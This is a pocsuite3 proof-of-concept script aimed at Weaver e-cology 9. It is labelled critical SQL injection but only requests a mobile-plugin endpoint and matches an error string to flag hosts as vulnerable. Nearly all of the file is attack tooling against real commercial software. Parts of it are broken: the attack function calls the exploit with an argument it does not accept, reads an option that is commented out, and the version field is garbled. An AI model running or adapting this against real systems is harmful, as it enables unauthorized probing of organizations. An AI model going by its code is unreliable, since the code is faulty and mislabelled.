#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
)
import os
minimum_version_required('2.0.3')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = 'xml'
    vulDate = '2023-04-23'
    createDate = '2023-04-23'
    updateDate = '2023-04-23'
    references = []
    name = ' weaver_e-cology_9_SQL_Injection'
    appPowerLink = 'https://www.weaver.com.cn/subpage/aboutus/news/news-detail.html?id=17238'
    appName = 'weaver_e-cology_9'
    appVersion = '¡Ü5.6'
    vulType = 'SQL Injection'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''
    severity="critical"
    # def _options(self):
    #     o = OrderedDict()
    #     o['param'] = OptString('', description='The param')
    #     return o

    def _exploit(self):


        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = '/mobile/plugin/CheckServer.jsp?type=mobileSetting'
        url=self.url+payload
        res = requests.get(url=url)
        logger.debug(res.text)
        return res

    def _verify(self):
        result = {}

        res = self._exploit()
        if res.status_code==200 and '"error":"system error"' in res.text and "securityIntercept" not in dict(res.headers).get("errorMsg"):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['info'] = {}
            result['VerifyInfo']['info']['Severity']=self.severity
            result['VerifyInfo']['info']['Result']=res.text
            result['VerifyInfo']['info']['file_name'] = os.path.basename(__file__)
        return self.parse_output(result)

    def _attack(self):
        result = {}
        param = self.get_option('param')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        return self.parse_output(result)

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
